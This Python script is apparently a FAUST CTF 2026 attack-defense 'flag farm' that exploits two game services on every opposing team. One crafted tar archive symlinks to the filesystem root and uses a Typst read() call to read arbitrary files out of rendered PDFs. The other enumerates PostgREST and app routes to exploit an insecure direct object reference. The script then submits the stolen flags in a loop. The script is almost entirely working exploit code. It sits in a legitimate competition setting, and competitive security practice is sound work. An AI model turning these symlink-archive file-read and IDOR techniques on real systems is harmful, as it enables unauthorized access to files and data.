#!/usr/bin/env python3
"""farm2.py - FAUST 2026 team 915. Alf + Rufflecopter ONLY. Loops every tick.
Does NOT touch farm.py / farm.db (IMC farm runs separately).
  python farm2.py            # loop both services every 120s
  python farm2.py --once      # single pass
  python farm2.py --service Alf
"""
import os, io, re, sys, json, time, zlib, socket, tarfile, secrets, argparse
import http.client, urllib.request
import concurrent.futures as cf

TEAMS_URL="https://2026.faustctf.net/competition/teams.json"
SUBMIT_HOST="submission.faustctf.net"; SUBMIT_PORT=666; OWN_TEAM=915
FLAG_RE=re.compile(rb"FAUST_[A-Za-z0-9/+]{32}")
SEEN_FILE="farm2_seen.txt"; LOCAL_TEAMS="teams_fresh.json"

def eprint(*a): print("[farm2]",*a,file=sys.stderr,flush=True)

def fetch_teams(url):
    try:
        req=urllib.request.Request(url,headers={"User-Agent":"farm2/915"})
        data=urllib.request.urlopen(req,timeout=20).read()
        try: open(LOCAL_TEAMS,"wb").write(data)
        except Exception: pass
        return json.loads(data.decode())
    except Exception as e:
        eprint("URL fail (%s), pakai %s"%(e,LOCAL_TEAMS))
        return json.loads(open(LOCAL_TEAMS).read())

def flatten(node):
    out=[]
    if isinstance(node,str): out.append(node)
    elif isinstance(node,list):
        for x in node: out.extend(flatten(x))
    elif isinstance(node,dict):
        for v in node.values(): out.extend(flatten(v))
    return out

def bracket(h): return "[%s]"%h if ":" in h and not h.startswith("[") else h

def _scan(body):
    found=set(); blobs=[body,body.replace(b"\x00",b"")]
    for m in re.finditer(rb"stream\r?\n",body):
        s=m.end(); e=body.find(b"endstream",s)
        if e!=-1:
            ch=body[s:e].strip(b"\r\n")
            try: blobs.append(zlib.decompress(ch))
            except Exception:
                try: blobs.append(zlib.decompressobj().decompress(ch))
                except Exception: pass
    for bl in blobs:
        for x in FLAG_RE.findall(bl): found.add(x.decode())
    return found

# ---- ALF (confirmed): tar symlink r->/ + typst read(); /app/data/<uid>/flag/flag.typ
ALF_PORT=1986; ALF_LANG="Xyrrathi"; ALF_TMPL="/app/data/{F}/flag/flag.typ"; ALF_T=8.0
def _alf_hh(h): return "[%s]:%d"%(h,ALF_PORT)
def _alf_register(h):
    u="u"+secrets.token_hex(8); p=secrets.token_hex(8)
    body=("username=%s&password=%s"%(u,p)).encode()
    c=http.client.HTTPConnection(h,ALF_PORT,timeout=ALF_T)
    c.request("POST","/register",body,{"Host":_alf_hh(h),"Content-Type":"application/x-www-form-urlencoded","Content-Length":str(len(body)),"Connection":"close"})
    r=c.getresponse(); r.read(); sc=r.getheader("Set-Cookie"); c.close()
    m=re.search(r"session=[^;]+",sc or ""); return m.group(0) if m else None
def _alf_lfi_tar(path):
    tb=io.BytesIO(); rel=path.lstrip("/")
    with tarfile.open(fileobj=tb,mode="w") as tar:
        li=tarfile.TarInfo("r"); li.type=tarfile.SYMTYPE; li.linkname="/"; tar.addfile(li)
        d=('#set document(title: read("r/%s"))\n'%rel).encode()
        ti=tarfile.TarInfo("main.typ"); ti.size=len(d); tar.addfile(ti,io.BytesIO(d))
    return tb.getvalue()
def _alf_upload(h,content,ck):
    b="----F%d"%(int(time.time()*1e6)&0xffffffff); buf=io.BytesIO()
    buf.write(("--%s\r\n"%b).encode()); buf.write(b'Content-Disposition: form-data; name="lang"\r\n\r\n'); buf.write(ALF_LANG.encode()+b"\r\n")
    buf.write(("--%s\r\n"%b).encode()); buf.write(('Content-Disposition: form-data; name="file"; filename="f%s.tar"\r\n'%secrets.token_hex(3)).encode())
    buf.write(b"Content-Type: application/octet-stream\r\n\r\n"); buf.write(content+b"\r\n"); buf.write(("--%s--\r\n"%b).encode())
    body=buf.getvalue()
    c=http.client.HTTPConnection(h,ALF_PORT,timeout=ALF_T)
    c.request("POST","/convert_file",body,{"Host":_alf_hh(h),"Content-Type":"multipart/form-data; boundary=%s"%b,"Content-Length":str(len(body)),"Connection":"close","Cookie":ck})
    r=c.getresponse(); d=r.read(); c.close(); return r.status,d
def alf_attack(team,node):
    h="fd66:666:%s::2"%team; ids=flatten(node); out=set()
    try:
        ck=_alf_register(h)
        if not ck: return out
        for F in ids:
            try: st,body=_alf_upload(h,_alf_lfi_tar(ALF_TMPL.format(F=F)),ck)
            except Exception: continue
            if body[:5]==b"%PDF-": out|=_scan(body)
    except Exception: pass
    return out

# ---- RUFFLECOPTER: PostgREST anon=owner IDOR via SWF (adaptive route probe)
RC_APP_PORTS=[35244,8080]; RC_PG_PORTS=[3000]; RC_T=3.5
RC_APP_TEMPLATES=[("GET","/receipts?id={u}"),("GET","/receipt?id={u}"),("GET","/receipts/{u}"),
 ("GET","/receipt/{u}"),("GET","/rents?id=eq.{u}&select=*"),("GET","/rents?id=eq.{u}"),
 ("GET","/rents/{u}"),("GET","/rent?id={u}"),("GET","/receipts?id=eq.{u}")]
RC_PG_DUMP=["/rents?select=*","/rents","/users?select=*"]; RC_PG_TMPL=["/rents?id=eq.{u}&select=*","/rents?id=eq.{u}"]
def _raw(host,port,method,path,headers=None,body=b"",deadline=None):
    if deadline and time.time()>deadline: return None
    try: infos=socket.getaddrinfo(host,port,0,socket.SOCK_STREAM)
    except socket.gaierror: return None
    if isinstance(body,str): body=body.encode()
    for fam,st,pr,_,sa in infos:
        s=None
        try:
            s=socket.socket(fam,st,pr); s.settimeout(RC_T); s.connect(sa)
            req="%s %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n"%(method,path,bracket(host),port)
            base={"User-Agent":"Mozilla/5.0","Accept":"*/*"}
            if body: base.setdefault("Content-Type","application/x-www-form-urlencoded"); base["Content-Length"]=str(len(body))
            if headers: base.update(headers)
            for k,v in base.items(): req+="%s: %s\r\n"%(k,v)
            req+="\r\n"; s.sendall(req.encode("latin-1","ignore")+body)
            ch=[]; tot=0
            while True:
                try: d=s.recv(65535)
                except Exception: break
                if not d: break
                ch.append(d); tot+=len(d)
                if tot>2_000_000: break
            raw=b"".join(ch); status=0; hdr=b""
            if raw:
                p0=raw.split(b"\r\n",1)[0].split(b" ")
                if len(p0)>=2 and p0[1].isdigit(): status=int(p0[1])
                hdr=raw.split(b"\r\n\r\n",1)[0]
            return (status,hdr.decode("latin-1","ignore"),raw)
        except Exception: return None
        finally:
            if s:
                try: s.close()
                except Exception: pass
    return None
def _rc_cookie(resp):
    if not resp: return None
    cs=[]
    for line in resp[1].split("\r\n"):
        if line.lower().startswith("set-cookie:"):
            v=line.split(":",1)[1].strip().split(";",1)[0].strip()
            if v: cs.append(v)
    return "; ".join(cs) if cs else None
def _rc_h(resp,found):
    if not resp: return 0
    n=0
    for m in FLAG_RE.findall(resp[2]):
        f=m.decode("ascii","ignore")
        if f not in found: found.add(f); n+=1
    return n
def ruffle_attack(team,node):
    host="fd66:666:%s::2"%team; uuids=flatten(node); found=set(); dl=time.time()+18.0
    for p in RC_PG_PORTS:
        if _raw(host,p,"GET","/",{"Accept":"application/json"},deadline=dl) is None: continue
        for path in RC_PG_DUMP: _rc_h(_raw(host,p,"GET",path,{"Accept":"application/json"},deadline=dl),found)
        for u in uuids:
            if found or time.time()>dl: break
            for t in RC_PG_TMPL: _rc_h(_raw(host,p,"GET",t.format(u=u),{"Accept":"application/json"},deadline=dl),found)
    app=None
    for p in RC_APP_PORTS:
        if _raw(host,p,"GET","/",deadline=dl) is not None: app=p; break
    if app is None: return found
    cookie=None
    try:
        creds="username=%s&password=%s"%(secrets.token_hex(5),secrets.token_hex(6))
        _raw(host,app,"POST","/register",body=creds,deadline=dl)
        lg=_raw(host,app,"POST","/login",body=creds,deadline=dl); cookie=_rc_cookie(lg); _rc_h(lg,found)
    except Exception: pass
    auth={"Cookie":cookie} if cookie else None
    for path in ("/receipts","/receipt","/rents"): _rc_h(_raw(host,app,"GET",path,auth,deadline=dl),found)
    winners=[]
    for u in uuids:
        if time.time()>dl: break
        before=len(found); tried=set()
        for (m,tpl,uc) in winners:
            _rc_h(_raw(host,app,m,tpl.format(u=u),auth if uc else None,deadline=dl),found); tried.add((m,tpl,uc))
            if len(found)>before: break
        if len(found)==before:
            for (m,tpl) in RC_APP_TEMPLATES:
                if time.time()>dl: break
                for uc in ((True,False) if auth else (False,)):
                    key=(m,tpl,uc)
                    if key in tried: continue
                    if _rc_h(_raw(host,app,m,tpl.format(u=u),auth if uc else None,deadline=dl),found):
                        if key not in winners: winners.insert(0,key)
                        break
                if len(found)>before: break
    return found

def submit(flags):
    flags=[f for f in flags if f]; res={}
    if not flags: return res
    try: s=socket.create_connection((SUBMIT_HOST,SUBMIT_PORT),timeout=15)
    except Exception as e: eprint("submit connect fail:",e); return res
    try:
        s.settimeout(15); buf=b""
        while b"\n\n" not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
        s.sendall(("\n".join(flags)+"\n").encode()); resp=b""; s.settimeout(15)
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                resp+=d
        except socket.timeout: pass
        for line in resp.decode("latin-1","ignore").splitlines():
            p=line.split()
            if len(p)>=2 and p[0].startswith("FAUST_"): res[p[0]]=p[1]
    except Exception as e: eprint("submit error:",e)
    finally:
        try: s.close()
        except Exception: pass
    return res

def load_seen():
    try: return set(l.strip() for l in open(SEEN_FILE) if l.strip())
    except FileNotFoundError: return set()
def save_seen(seen):
    try: open(SEEN_FILE,"w").write("\n".join(sorted(seen)))
    except Exception as e: eprint("save seen fail:",e)

ATTACKERS={"Alf":alf_attack,"Rufflecopter":ruffle_attack}
def one_tick(args,seen):
    data=fetch_teams(args.teams_url); flag_ids=data.get("flag_ids",{})
    services=[s for s in ATTACKERS if (not args.service or s.lower()==args.service.lower())]
    fresh=set()
    for svc in services:
        svc_map=flag_ids.get(svc) or {}
        targets=[(t,node) for t,node in svc_map.items() if str(t)!=str(OWN_TEAM) and flatten(node)]
        eprint("service=%s targets=%d"%(svc,len(targets)))
        attack=ATTACKERS[svc]
        with cf.ThreadPoolExecutor(max_workers=args.workers) as pool:
            futs={pool.submit(attack,t,node):t for t,node in targets}
            for fut in cf.as_completed(futs):
                try: got=fut.result()
                except Exception: got=set()
                new=got-seen
                if new: eprint("  %s team %s -> %d new"%(svc,futs[fut],len(new))); fresh|=new
    if not fresh: eprint("tick: 0 flag baru"); return seen
    res=submit(fresh)
    from collections import Counter
    eprint("submit: %s (kirim %d)"%(dict(Counter(res.values())),len(fresh)))
    for f,c in res.items():
        if c in ("OK","DUP","OLD","OWN"): seen.add(f)
    save_seen(seen); return seen

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--service",default=None)
    ap.add_argument("--teams-url",default=TEAMS_URL)
    ap.add_argument("--workers",type=int,default=48)
    ap.add_argument("--interval",type=int,default=120)
    ap.add_argument("--once",action="store_true")
    args=ap.parse_args(); seen=load_seen()
    while True:
        t0=time.time()
        try: seen=one_tick(args,seen)
        except KeyboardInterrupt: eprint("stop."); break
        except Exception as e: eprint("tick error:",e)
        if args.once: break
        w=max(5,args.interval-(time.time()-t0)); eprint("sleep %.0fs\n"%w); time.sleep(w)

if __name__=="__main__": main()